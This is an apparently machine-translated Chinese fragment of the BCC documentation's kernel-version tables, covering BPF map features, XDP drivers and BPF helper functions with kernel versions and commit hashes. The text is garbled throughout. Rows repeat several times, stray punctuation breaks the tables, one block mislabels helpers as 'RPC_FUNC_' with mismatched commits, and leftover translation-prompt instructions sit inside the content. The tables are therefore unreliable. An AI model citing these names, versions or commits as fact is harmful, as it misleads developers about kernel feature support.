\u67e5\u627e/\u66f4\u65b0\u7684<code>BPF_F_LOCK</code>\u6807\u5fd7 5.1 <code>96049f3afd50</code> \u9650\u5236\u4eceBPF\u65b9\u9762\u7684\u8bbf\u95ee 5.2 <code>591fe9888d78</code> <code>FREEZE</code> 5.2 <code>87df15de441b</code> \u6570\u7ec4\u6620\u5c04\u7684mmap()\u652f\u6301 5.5 <code>fc9702273e2e</code> <code>LOOKUP_BATCH</code> 5.6 <code>cb4d03ab499d</code> <code>UPDATE_BATCH</code>, <code>DELETE_BATCH</code> 5.6 <code>aa2e93b8e58e</code> <code>LOOKUP_AND_DELETE_BATCH</code> 5.6 <code>057996380a42</code> <code>LOOKUP_AND_DELETE_ELEM</code>\u54c8\u5e0c\u6620\u5c04\u7684\u652f\u6301 5.14 <code>3e87f192b405</code>"},{"location":"tutorials/bcc-documents/kernel-versions/#xdp","title":"XDP","text":"<p>\u60a8\u7684\u5185\u6838\u652f\u6301XDP\u7a0b\u5e8f\u7684\u9a71\u52a8\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u7684\u8fd1\u4f3c\u5217\u8868\u53ef\u4ee5\u7528\u4ee5\u4e0b\u547d\u4ee4\u68c0\u7d22: ```sh````git grep -l XDP_SETUP_PROG drivers/</p> \u529f\u80fd/\u9a71\u52a8 \u5185\u6838\u7248\u672c \u63d0\u4ea4 XDP\u6838\u5fc3\u67b6\u6784 4.8 <code>6a773a15a1e8</code> \u64cd\u4f5c\uff1a\u4e22\u5f03 4.8 <code>6a773a15a1e8</code> \u64cd\u4f5c\uff1a\u4f20\u9012\u5230\u5806\u6808 4.8 <code>6a773a15a1e8</code> \u76f4\u63a5\u8f6c\u53d1\uff08\u540c\u4e00\u7aef\u53e3\uff09 4.8 <code>6ce96ca348a9</code> \u76f4\u63a5\u6570\u636e\u5305\u6570\u636e\u5199\u5165 4.8 <code>4acf6c0b84c9</code> Mellanox <code>mlx4</code>\u9a71\u52a8 4.8 <code>47a38e155037</code> Mellanox <code>mlx5</code>\u9a71\u52a8 4.9 <code>86994156c736</code> Netronome <code>nfp</code>\u9a71\u52a8 4.10 <code>ecd63a0217d5</code> QLogic\uff08Cavium\uff09<code>qed*</code>\u9a71\u52a8 4.10 <code>496e05170958</code> <code>virtio_net</code>\u9a71\u52a8 4.10 <code>f600b6905015</code> Broadcom <code>bnxt_en</code>\u9a71\u52a8 4.11 <code>c6d30e8391b8</code> Intel <code>ixgbe*</code>\u9a71\u52a8 4.12 <code>924708081629</code> Cavium <code>thunderx</code>\u9a71\u52a8 4.12 <code>05c773f52b96</code> \u901a\u7528XDP 4.12 <code>b5cdae3291f7</code>` <p>\u6ce8\u610f\uff1a \u672c\u6b21\u7ffb\u8bd1\u4ec5\u5305\u62ec\u7ffb\u8bd1\u90e8\u5206\uff0c\u4e0d\u5305\u62ec\u539f\u59cb\u6587\u672c\u3002## \u5e2e\u52a9\u8005</p> <p>\u60a8\u7684\u5185\u6838\u652f\u6301\u7684\u8f85\u52a9\u8005\u5217\u8868\u53ef\u5728\u6587\u4ef6\u4e2d\u627e\u5230\u3002</p> <p>Intel <code>i40e</code> \u9a71\u52a8\u7a0b\u5e8f | 4.13 | <code>0c8493d90b6b</code></p> <p>\u64cd\u4f5c\uff1a\u91cd\u5b9a\u5411 | 4.14 | <code>6453073987ba</code></p> <p>\u652f\u6301 tap | 4.14 | <code>761876c857cb</code></p> <p>\u652f\u6301 veth | 4.14 | <code>d445516966dc</code></p> <p>Intel <code>ixgbevf</code> \u9a71\u52a8\u7a0b\u5e8f | 4.17 | <code>c7aec59657b6</code></p> <p>Freescale <code>dpaa2</code> \u9a71\u52a8\u7a0b\u5e8f | 5.0 | <code>7e273a8ebdd3</code></p> <p>Socionext <code>netsec</code> \u9a71\u52a8\u7a0b\u5e8f | 5.3 | <code>ba2b232108d3</code></p> <p>TI <code>cpsw</code> \u9a71\u52a8\u7a0b\u5e8f | 5.3 | <code>9ed4050c0d75</code></p> <p>Intel <code>ice</code> \u9a71\u52a8\u7a0b\u5e8f |5.5| <code>efc2214b6047</code></p> <p>Solarflare <code>sfc</code> \u9a71\u52a8\u7a0b\u5e8f | 5.5 | <code>eb9a36be7f3e</code></p> <p>Marvell <code>mvneta</code> \u9a71\u52a8\u7a0b\u5e8f | 5.5 | <code>0db51da7a8e9</code></p> <p>Microsoft <code>hv_netvsc</code> \u9a71\u52a8\u7a0b\u5e8f | 5.6 | <code>351e1581395f</code></p> <p>Amazon <code>ena</code> \u9a71\u52a8\u7a0b\u5e8f | 5.6 | <code>838c93dc5449</code></p> <p><code>xen-netfront</code> \u9a71\u52a8\u7a0b\u5e8f | 5.9 | <code>6c5aa6fc4def</code></p> <p>Intel <code>gi</code> \u9a71\u52a8\u7a0b\u5e8f | 5.10 | <code>9cbc948b5a20</code><code>include/uapi/linux/bpf.h</code>: <code>include/uapi/linux/bpf.h</code>:</p> <pre><code>git grep ' FN(' include/uapi/linux/bpf.h\n</code></pre> <p>\u6309\u5b57\u6bcd\u987a\u5e8f\u6392\u5217</p> Helper \u5185\u6838\u7248\u672c \u6388\u6743\u8bb8\u53ef \u63d0\u4ea4\u8bb0\u5f55 <code>BPF_FUNC_bind()</code> 4.17 <code>d74bad4e74ee</code> <code>BPF_FUNC_bprm_opts_set()</code> 5.11 <code>3f6719c7b62f</code> <code>BPF_FUNC_btf_find_by_name_kind()</code> 5.14 <code>3d78417b60fb</code> <code>BPF_FUNC_cgrp_storage_delete()</code> 6.2 <code>c4bcfb38a95e</code> <code>BPF_FUNC_cgrp_storage_get()</code> 6.2 <code>c4bcfb38a95e</code> <code>BPF_FUNC_check_mtu()</code> 5.12 <code>34b2021cc616</code> <code>BPF_FUNC_clone_redirect()</code> 4.2 <code>3896d655f4d4</code> <code>BPF_FUNC_copy_from_user()</code> 5.10 <code>07be4c4a3e7a</code> <code>BPF_FUNC_copy_from_user_task()</code> 5.18 GPL <code>376040e47334</code> <code>BPF_FUNC_csum_diff()</code> 4.6 <code>7d672345ed29</code> <code>BPF_FUNC_csum_level()</code> 5.7 <code>7cdec54f9713</code> <code>BPF_FUNC_csum_update()</code> 4.9 <code>36bbef52c7eb</code>\"<code>BPF_FUNC_current_task_under_cgroup()</code> <code>BPF_FUNC_d_path()</code> 5.10 <code>6e22ab9da793</code> <code>BPF_FUNC_dynptr_data()</code> 5.19 <code>34d4ef5775f7</code> <code>BPF_FUNC_dynptr_from_mem()</code> 5.19 <code>263ae152e962</code> <code>BPF_FUNC_dynptr_read()</code> 5.19 <code>13bbbfbea759</code> <code>BPF_FUNC_dynptr_write()</code> 5.19 <code>13bbbfbea759</code> <code>BPF_FUNC_fib_lookup()</code> 4.18 GPL <code>87f5fc7e48dd</code> <code>BPF_FUNC_find_vma()</code> 5.17 <code>7c7e3d31e785</code> <code>BPF_FUNC_for_each_map_elem()</code> 5.13 <code>69c087ba6225</code> <code>BPF_FUNC_get_attach_cookie()</code> 5.15 <code>7adfc6c9b315</code> <code>BPF_FUNC_get_branch_snapshot()</code> 5.16 GPL <code>856c02dbce4f</code> <code>BPF_FUNC_get_current_ancestor_cgroup_id()</code> 5.6 <code>b4490c5c4e02</code> <code>BPF_FUNC_get_cgroup_classid()</code> 4.3 <code>8d20aabe1c76</code> <code>BPF_FUNC_get_current_cgroup_id()</code> 4.18 <code>bf6fa2c893c5</code> <code>BPF_FUNC_current_task_under_cgroup()</code> 4.9 <code>60d20f9195b2</code> <code>BPF_FUNC_d_path()</code> 5.10 <code>6e22ab9da793</code> <code>BPF_FUNC_dynptr_data()</code> 5.19 <code>34d4ef5775f7</code> <code>BPF_FUNC_dynptr_from_mem()</code> 5.19 <code>263ae152e962</code> <code>BPF_FUNC_dynptr_read()</code> 5.19 <code>13bbbfbea759</code> <code>BPF_FUNC_dynptr_write()</code> 5.19 <code>13bbbfbea759</code> <code>BPF_FUNC_fib_lookup()</code> 4.18 GPL <code>87f5fc7e48dd</code> <code>BPF_FUNC_find_vma()</code> 5.17 <code>7c7e3d31e785</code> <code>BPF_FUNC_for_each_map_elem()</code> 5.13 <code>69c087ba6225</code> <code>BPF_FUNC_get_attach_cookie()</code> 5.15 <code>7adfc6c9b315</code> <code>BPF_FUNC_get_branch_snapshot()</code> 5.16 GPL <code>856c02dbce4f</code> <code>BPF_FUNC_get_current_ancestor_cgroup_id()</code> 5.6 <code>b4490c5c4e02</code> <code>BPF_FUNC_get_cgroup_classid()</code> 4.3 <code>8d20aabe1c76</code> <code>BPF_FUNC_get_current_cgroup_id()</code> 4.18 <code>bf6fa2c893c5</code>\".\"<code>BPF_FUNC_get_current_comm()</code> <code>BPF_FUNC_get_current_pid_tgid()</code> 4.2 <code>ffeedafbf023</code> <code>BPF_FUNC_get_current_task()</code> 4.8 GPL <code>606274c5abd8</code> <code>BPF_FUNC_get_current_task_btf()</code> 5.11 GPL <code>3ca1032ab7ab</code> <code>BPF_FUNC_get_current_uid_gid()</code> 4.2 <code>ffeedafbf023</code> <code>BPF_FUNC_get_func_arg()</code> 5.17 <code>f92c1e183604</code> <code>BPF_FUNC_get_func_arg_cnt()</code> 5.17 <code>f92c1e183604</code> <code>BPF_FUNC_get_func_ip()</code> 5.15 <code>5d8b583d04ae</code> <code>BPF_FUNC_get_func_ret()</code> 5.17 <code>f92c1e183604</code> <code>BPF_FUNC_get_retval()</code> 5.18 <code>b44123b4a3dc</code> <code>BPF_FUNC_get_hash_recalc()</code> 4.8 <code>13c5c240f789</code> <code>BPF_FUNC_get_listener_sock()</code> 5.1 <code>dbafd7ddd623</code> <code>BPF_FUNC_get_local_storage()</code> 4.19 <code>cd3394317653</code> <code>BPF_FUNC_get_netns_cookie()</code> 5.7 <code>f318903c0bf4</code><code>BPF_FUNC_get_ns_current_pid_tgid()</code> <code>BPF_FUNC_get_numa_node_id()</code> 4.10 <code>2d0e30c30f84</code> <code>BPF_FUNC_get_prandom_u32()</code> 4.1 <code>03e69b508b6f</code> <code>BPF_FUNC_get_route_realm()</code> 4.4 <code>c46646d0484f</code> <code>BPF_FUNC_get_smp_processor_id()</code> 4.1 <code>c04167ce2ca0</code> <code>BPF_FUNC_get_socket_cookie()</code> 4.12 <code>91b8270f2a4d</code> <code>BPF_FUNC_get_socket_uid()</code> 4.12 <code>6acc5c291068</code> <code>BPF_FUNC_get_stack()</code> 4.18 GPL <code>de2ff05f48af</code> <code>BPF_FUNC_get_stackid()</code> 4.6 GPL <code>d5a3b1f69186</code> <code>BPF_FUNC_get_task_stack()</code> 5.9 <code>fa28dcb82a38</code> <code>BPF_FUNC_getsockopt()</code> 4.15 <code>cd86d1fd2102</code> <code>BPF_FUNC_ima_file_hash()</code> 5.18 <code>174b16946e39</code> <code>BPF_FUNC_ima_inode_hash()</code> 5.11 <code>27672f0d280a</code> <code>BPF_FUNC_inode_storage_delete()</code> 5.10 <code>8ea636848aca</code> RPC_FUNC_get_ns_current_pid_tgid() 5.7 b4490c5c4e02 RPC_FUNC_get_numa_node_id() 4.10 2d0e30c30f84 RPC_FUNC_get_prandom_u32() 4.1 03e69b508b6f RPC_FUNC_get_route_realm() 4.4 c46646d0484f RPC_FUNC_get_smp_processor_id() 4.1 c04167ce2ca0 RPC_FUNC_get_socket_cookie() 4.12 91b8270f2a4d RPC_FUNC_get_socket_uid() 4.12 6acc5c291068 RPC_FUNC_get_stack() 4.18 GPL de2ff05f48af RPC_FUNC_get_stackid() 4.6 GPL d5a3b1f69186 RPC_FUNC_get_task_stack() 5.9 fa28dcb82a38 RPC_FUNC_getsockopt() 4.15 cd86d1fd2102 RPC_FUNC_ima_file_hash() 5.18 174b16946e39 RPC_FUNC_ima_inode_hash() 5.11 27672f0d280a RPC_FUNC_inode_storage_delete() 5.10 8ea636848aca\".\"<code>BPF_FUNC_inode_storage_get()</code> <code>BPF_FUNC_jiffies64()</code> 5.5 <code>5576b991e9c1</code> <code>BPF_FUNC_kallsyms_lookup_name()</code> 5.16 <code>d6aef08a872b</code> <code>BPF_FUNC_kptr_xchg()</code> 5.19 <code>c0a5a21c25f3</code> <code>BPF_FUNC_ktime_get_boot_ns()</code> 5.8 <code>71d19214776e</code> <code>BPF_FUNC_ktime_get_coarse_ns()</code> 5.11 <code>d05512618056</code> <code>BPF_FUNC_ktime_get_ns()</code> 4.1 <code>d9847d310ab4</code> <code>BPF_FUNC_ktime_get_tai_ns()</code> 6.1 <code>c8996c98f703</code> <code>BPF_FUNC_l3_csum_replace()</code> 4.1 <code>91bc4822c3d6</code> <code>BPF_FUNC_l4_csum_replace()</code> 4.1 <code>91bc4822c3d6</code> <code>BPF_FUNC_load_hdr_opt()</code> 5.10 <code>0813a841566f</code> <code>BPF_FUNC_loop()</code> 5.17 <code>e6f2dd0f8067</code> <code>BPF_FUNC_lwt_push_encap()</code> 4.18 <code>fe94cc290f53</code> <code>BPF_FUNC_lwt_seg6_action()</code> 4.18 <code>fe94cc290f53</code>`BPF_FUNC_lwt_seg6_adjust_srh()` `BPF_FUNC_lwt_seg6_store_bytes()` 4.18 <code>fe94cc290f53</code> `BPF_FUNC_map_delete_elem()` 3.19 <code>d0003ec01c66</code> `BPF_FUNC_map_lookup_elem()` 3.19 <code>d0003ec01c66</code> `BPF_FUNC_map_lookup_percpu_elem()` 5.19 <code>07343110b293</code> `BPF_FUNC_map_peek_elem()` 4.20 <code>f1a2e44a3aec</code> `BPF_FUNC_map_pop_elem()` 4.20 <code>f1a2e44a3aec</code> `BPF_FUNC_map_push_elem()` 4.20 <code>f1a2e44a3aec</code> `BPF_FUNC_map_update_elem()` 3.19 <code>d0003ec01c66</code> `BPF_FUNC_msg_apply_bytes()` 4.17 <code>2a100317c9eb</code> `BPF_FUNC_msg_cork_bytes()` 4.17 <code>91843d540a13</code> `BPF_FUNC_msg_pop_data()` 5.0 <code>7246d8ed4dcc</code> `BPF_FUNC_msg_pull_data()` 4.17 <code>015632bb30da</code> `BPF_FUNC_msg_push_data()` 4.20 <code>6fff607e2f14</code>\".<code>BPF_FUNC_msg_redirect_hash()</code> <code>BPF_FUNC_msg_redirect_map()</code> 4.17 <code>4f738adba30a</code> <code>BPF_FUNC_per_cpu_ptr()</code> 5.10 <code>eaa6bcb71ef6</code> <code>BPF_FUNC_perf_event_output()</code> 4.4 GPL <code>a43eec304259</code> <code>BPF_FUNC_perf_event_read()</code> 4.3 GPL <code>35578d798400</code> <code>BPF_FUNC_perf_event_read_value()</code> 4.15 GPL <code>908432ca84fc</code> <code>BPF_FUNC_perf_prog_read_value()</code> 4.15 GPL <code>4bebdc7a85aa</code> <code>BPF_FUNC_probe_read()</code> 4.1 GPL <code>2541517c32be</code> <code>BPF_FUNC_probe_read_kernel()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_kernel_str()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_user()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_user_str()</code> 5.5 GPL <code>6ae08ae3dea2</code> <code>BPF_FUNC_probe_read_str()</code> 4.11 GPL <code>a5e8c07059d0</code> <code>BPF_FUNC_probe_write_user()</code> 4.8 GPL <code>96ae52279594</code>\"<code>BPF_FUNC_rc_keydown()</code> <code>BPF_FUNC_rc_pointer_rel()</code> 5.0 GPL <code>01d3240a04f4</code> <code>BPF_FUNC_rc_repeat()</code> 4.18 GPL <code>f4364dcfc86d</code> <code>BPF_FUNC_read_branch_records()</code> 5.6 GPL <code>fff7b64355ea</code> <code>BPF_FUNC_redirect()</code> 4.4 <code>27b29f63058d</code> <code>BPF_FUNC_redirect_map()</code> 4.14 <code>97f91a7cf04f</code> <code>BPF_FUNC_redirect_neigh()</code> 5.10 <code>b4ab31414970</code> <code>BPF_FUNC_redirect_peer()</code> 5.10 <code>9aa1206e8f48</code> <code>BPF_FUNC_reserve_hdr_opt()</code> 5.10 <code>0813a841566f</code> <code>BPF_FUNC_ringbuf_discard()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_discard_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_ringbuf_output()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_query()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_reserve()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_reserve_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_ringbuf_submit()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_submit_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_send_signal()</code> 5.3 <code>8b401f9ed244</code> <code>BPF_FUNC_send_signal_thread()</code> 5.5 <code>8482941f0906</code> <code>BPF_FUNC_seq_printf()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_seq_printf_btf()</code> 5.10 <code>eb411377aed9</code> <code>BPF_FUNC_seq_write()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_set_hash()</code> 4.13 <code>ded092cd73c2</code> <code>BPF_FUNC_set_hash_invalid()</code> 4.9 <code>7a4b28c6cc9f</code> <code>BPF_FUNC_set_retval()</code> 5.18 <code>b44123b4a3dc</code> <code>BPF_FUNC_setsockopt()</code> 4.13 <code>8c4b4c7e9ff0</code> <code>BPF_FUNC_sk_ancestor_cgroup_id()</code> 5.7 <code>f307fa2cb4c9</code> <code>BPF_FUNC_sk_assign()</code> 5.6 <code>cf7fbe660f2d</code><code>BPF_FUNC_ringbuf_reserve_dynptr()</code> <code>BPF_FUNC_ringbuf_submit()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_submit_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_send_signal()</code> 5.3 <code>8b401f9ed244</code> <code>BPF_FUNC_send_signal_thread()</code> 5.5 <code>8482941f0906</code> <code>BPF_FUNC_seq_printf()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_seq_printf_btf()</code> 5.10 <code>eb411377aed9</code> <code>BPF_FUNC_seq_write()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_set_hash()</code> 4.13 <code>ded092cd73c2</code> <code>BPF_FUNC_set_hash_invalid()</code> 4.9 <code>7a4b28c6cc9f</code> <code>BPF_FUNC_set_retval()</code> 5.18 <code>b44123b4a3dc</code> <code>BPF_FUNC_setsockopt()</code> 4.13 <code>8c4b4c7e9ff0</code> <code>BPF_FUNC_sk_ancestor_cgroup_id()</code> 5.7 <code>f307fa2cb4c9</code> <code>BPF_FUNC_sk_assign()</code> 5.6 <code>cf7fbe660f2d</code> <code>BPF_FUNC_ringbuf_reserve_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_ringbuf_submit()</code> 5.8 <code>457f44363a88</code> <code>BPF_FUNC_ringbuf_submit_dynptr()</code> 5.19 <code>bc34dee65a65</code> <code>BPF_FUNC_send_signal()</code> 5.3 <code>8b401f9ed244</code> <code>BPF_FUNC_send_signal_thread()</code> 5.5 <code>8482941f0906</code> <code>BPF_FUNC_seq_printf()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_seq_printf_btf()</code> 5.10 <code>eb411377aed9</code> <code>BPF_FUNC_seq_write()</code> 5.7 GPL <code>492e639f0c22</code> <code>BPF_FUNC_set_hash()</code> 4.13 <code>ded092cd73c2</code> <code>BPF_FUNC_set_hash_invalid()</code> 4.9 <code>7a4b28c6cc9f</code> <code>BPF_FUNC_set_retval()</code> 5.18 <code>b44123b4a3dc</code> <code>BPF_FUNC_setsockopt()</code> 4.13 <code>8c4b4c7e9ff0</code> <code>BPF_FUNC_sk_ancestor_cgroup_id()</code> 5.7 <code>f307fa2cb4c9</code> <code>BPF_FUNC_sk_assign()</code> 5.6 <code>cf7fbe660f2d</code>\".\"<code>BPF_FUNC_sk_cgroup_id()</code> <code>BPF_FUNC_sk_fullsock()</code> 5.1 <code>46f8bc92758c</code> <code>BPF_FUNC_sk_lookup_tcp()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_lookup_udp()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_redirect_hash()</code> 4.18 <code>81110384441a</code> <code>BPF_FUNC_sk_redirect_map()</code> 4.14 <code>174a79ff9515</code> <code>BPF_FUNC_sk_release()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_select_reuseport()</code> 4.19 <code>2dbb9b9e6df6</code> <code>BPF_FUNC_sk_storage_delete()</code> 5.2 <code>6ac99e8f23d4</code> <code>BPF_FUNC_sk_storage_get()</code> 5.2 <code>6ac99e8f23d4</code> <code>BPF_FUNC_skb_adjust_room()</code> 4.13 <code>2be7e212d541</code> <code>BPF_FUNC_skb_ancestor_cgroup_id()</code> 4.19 <code>7723628101aa</code> <code>BPF_FUNC_skb_change_head()</code> 4.10 <code>3a0af8fd61f9</code> <code>BPF_FUNC_skb_change_proto()</code> 4.8 <code>6578171a7ff0</code> <code>BPF_FUNC_sk_cgroup_id()</code> 5.7 <code>f307fa2cb4c9</code> <code>BPF_FUNC_sk_fullsock()</code> 5.1 <code>46f8bc92758c</code> <code>BPF_FUNC_sk_lookup_tcp()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_lookup_udp()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_redirect_hash()</code> 4.18 <code>81110384441a</code> <code>BPF_FUNC_sk_redirect_map()</code> 4.14 <code>174a79ff9515</code> <code>BPF_FUNC_sk_release()</code> 4.20 <code>6acc9b432e67</code> <code>BPF_FUNC_sk_select_reuseport()</code> 4.19 <code>2dbb9b9e6df6</code> <code>BPF_FUNC_sk_storage_delete()</code> 5.2 <code>6ac99e8f23d4</code> <code>BPF_FUNC_sk_storage_get()</code> 5.2 <code>6ac99e8f23d4</code> <code>BPF_FUNC_skb_adjust_room()</code> 4.13 <code>2be7e212d541</code> <code>BPF_FUNC_skb_ancestor_cgroup_id()</code> 4.19 <code>7723628101aa</code> <code>BPF_FUNC_skb_change_head()</code> 4.10 <code>3a0af8fd61f9</code> <code>BPF_FUNC_skb_change_proto()</code> 4.8 <code>6578171a7ff0</code><code>\u3002\"</code>BPF_FUNC_skb_change_tail()<code>| 4.9 |  | [</code>5293efe62df8`](https://github.com/torvalds/linux/commit/5293efe62df81908f2e90c9820c7edcc8e61f5e9) <code>BPF_FUNC_skb_change_type()</code> 4.8 <code>d2485c4242a8</code> <code>BPF_FUNC_skb_cgroup_classid()</code> 5.10 <code>b426ce83baa7</code> <code>BPF_FUNC_skb_cgroup_id()</code> 4.18 <code>cb20b08ead40</code> <code>BPF_FUNC_skb_ecn_set_ce()</code> 5.1 <code>f7c917ba11a6</code> <code>BPF_FUNC_skb_get_tunnel_key()</code> 4.3 <code>d3aa45ce6b94</code> <code>BPF_FUNC_skb_get_tunnel_opt()</code> 4.6 <code>14ca0751c96f</code> <code>BPF_FUNC_skb_get_xfrm_state()</code> 4.18 <code>12bed760a78d</code> <code>BPF_FUNC_skb_load_bytes()</code> 4.5 <code>05c74e5e53f6</code> <code>BPF_FUNC_skb_load_bytes_relative()</code> 4.18 <code>4e1ec56cdc59</code> <code>BPF_FUNC_skb_output()</code> 5.5 <code>a7658e1a4164</code> <code>BPF_FUNC_skb_pull_data()</code> 4.9 <code>36bbef52c7eb</code> <code>BPF_FUNC_skb_set_tstamp()</code> 5.18 <code>9bb984f28d5b</code> <code>BPF_FUNC_skb_set_tunnel_key()</code> 4.3 <code>d3aa45ce6b94</code> <code>BPF_FUNC_skb_set_tunnel_opt()</code> 4.6 <code>14ca0751c96f</code> <code>BPF_FUNC_skb_store_bytes()</code> 4.1 <code>91bc4822c3d6</code> <code>BPF_FUNC_skb_under_cgroup()</code> 4.8 <code>4a482f34afcc</code> <code>BPF_FUNC_skb_vlan_pop()</code> 4.3 <code>4e10df9a60d9</code> <code>BPF_FUNC_skb_vlan_push()</code> 4.3 <code>4e10df9a60d9</code> <code>BPF_FUNC_skc_lookup_tcp()</code> 5.2 <code>edbf8c01de5a</code> <code>BPF_FUNC_skc_to_mctcp_sock()</code> 5.19 <code>3bc253c2e652</code> <code>BPF_FUNC_skc_to_tcp_sock()</code> 5.9 <code>478cfbdf5f13</code> <code>BPF_FUNC_skc_to_tcp_request_sock()</code> 5.9 <code>478cfbdf5f13</code> <code>BPF_FUNC_skc_to_tcp_timewait_sock()</code> 5.9 <code>478cfbdf5f13</code> <code>BPF_FUNC_skc_to_tcp6_sock()</code> 5.9 <code>af7ec1383361</code> <code>BPF_FUNC_skc_to_udp6_sock()</code> 5.9 <code>0d4fad3e57df</code> <code>BPF_FUNC_skc_to_unix_sock()</code> 5.16 <code>9eeb3aa33ae0</code> <code>BPF_FUNC_snprintf()</code> 5.13 <code>7b15523a989b</code>\".\"<code>BPF_FUNC_snprintf_btf()</code> <code>BPF_FUNC_sock_from_file()</code> 5.11 <code>4f19cab76136</code> <code>BPF_FUNC_sock_hash_update()</code> 4.18 <code>81110384441a</code> <code>BPF_FUNC_sock_map_update()</code> 4.14 <code>174a79ff9515</code> <code>BPF_FUNC_spin_lock()</code> 5.1 <code>d83525ca62cf</code> <code>BPF_FUNC_spin_unlock()</code> 5.1 <code>d83525ca62cf</code> <code>BPF_FUNC_store_hdr_opt()</code> 5.10 <code>0813a841566f</code> <code>BPF_FUNC_strncmp()</code> 5.17 <code>c5fb19937455</code> <code>BPF_FUNC_strtol()</code> 5.2 <code>d7a4cb9b6705</code> <code>BPF_FUNC_strtoul()</code> 5.2 <code>d7a4cb9b6705</code> <code>BPF_FUNC_sys_bpf()</code> 5.14 <code>79a7f8bdb159</code> <code>BPF_FUNC_sys_close()</code> 5.14 <code>3abea089246f</code> <code>BPF_FUNC_sysctl_get_current_value()</code> 5.2 <code>1d11b3016cec</code> <code>BPF_FUNC_sysctl_get_name()</code> 5.2 <code>808649fb787d</code>\". \u683c\u5f0f\uff1a\u53ea\u8fd4\u56de\u7ffb\u8bd1\u540e\u7684\u5185\u5bb9\uff0c\u4e0d\u5305\u62ec\u539f\u6587\u3002<code>BPF_FUNC_sysctl_get_new_value()</code>| 5.2| | <code>4e63acdff864</code> <code>BPF_FUNC_sysctl_set_new_value()</code>|5.2| | <code>4e63acdff864</code> <code>BPF_FUNC_tail_call()</code>|4.2| | <code>04fd61ab36ec</code> <code>BPF_FUNC_task_pt_regs()</code>|5.15| GPL | <code>dd6e10fbd9f</code> <code>BPF_FUNC_task_storage_delete()</code>|5.11| | <code>4cf1bc1f1045</code> <code>BPF_FUNC_task_storage_get()</code>|5.11| | <code>4cf1bc1f1045</code> <code>BPF_FUNC_tcp_check_syncookie()</code>|5.2| | <code>399040847084</code> <code>BPF_FUNC_tcp_gen_syncookie()</code>|5.3| | <code>70d66244317e</code> <code>BPF_FUNC_tcp_raw_check_syncookie_ipv4()</code>|6.0| | <code>33bf9885040c</code> <code>BPF_FUNC_tcp_raw_check_syncookie_ipv6()</code>|6.0| | <code>33bf9885040c</code> <code>BPF_FUNC_tcp_raw_gen_syncookie_ipv4()</code>|6.0| | <code>33bf9885040c</code> <code>BPF_FUNC_tcp_raw_gen_syncookie_ipv6()</code>|6.0| | <code>33bf9885040c</code> <code>BPF_FUNC_tcp_send_ack()</code>|5.5 | | <code>206057fe020a</code><code>BPF_FUNC_tcp_sock()</code> 5.1 <code>655a51e536c0</code> <code>BPF_FUNC_this_cpu_ptr()</code> 5.10 <code>63d9b80dcf2c</code> <code>BPF_FUNC_timer_init()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_timer_set_callback()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_timer_start()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_timer_cancel()</code> 5.15 <code>b00628b1c7d5</code> <code>BPF_FUNC_trace_printk()</code> 4.1 GPL <code>9c959c863f82</code> <code>BPF_FUNC_trace_vprintk()</code> 5.16 GPL <code>10aceb629e19</code> <code>BPF_FUNC_user_ringbuf_drain()</code> 6.1 <code>205715673844</code> <code>BPF_FUNC_xdp_adjust_head()</code> 4.10 <code>17bedab27231</code> <code>BPF_FUNC_xdp_adjust_meta()</code> 4.15 <code>de8f3a83b0a0</code> <code>BPF_FUNC_xdp_adjust_tail()</code> 4.18 <code>b32cc5b9a346</code> <code>BPF_FUNC_xdp_get_buff_len()</code> 5.18 <code>0165cc817075</code> <code>BPF_FUNC_xdp_load_bytes()</code> 5.18 <code>3f364222d032</code> <code>BPF_FUNC_xdp_store_bytes()</code> 5.18 <code>3f364222d032</code> <code>BPF_FUNC_xdp_output()</code> 5.6 GPL <code>d831ee84bfc9</code> <code>BPF_FUNC_override_return()</code> 4.16 GPL <code>9802d86585db</code> <code>BPF_FUNC_sock_ops_cb_flags_set()</code> 4.16 <code>b13d88072172</code> <p>\u6ce8\uff1a\u4ec5GPL\u517c\u5bb9\u7684BPF\u52a9\u624b\u9700\u8981GPL\u517c\u5bb9\u7684\u8bb8\u53ef\u8bc1\u3002\u5185\u6838\u6240\u8ba4\u53ef\u7684\u5f53\u524dGPL\u517c\u5bb9\u8bb8\u53ef\u8bc1\u6709\uff1a</p> <ul> <li>GPL</li> <li>GPL v2</li> <li>GPL\u548c\u5176\u4ed6\u6743\u5229</li> <li>\u53ccBSD/GPL</li> <li>\u53ccMIT/GPL</li> <li>\u53ccMPL/GPL</li> </ul> 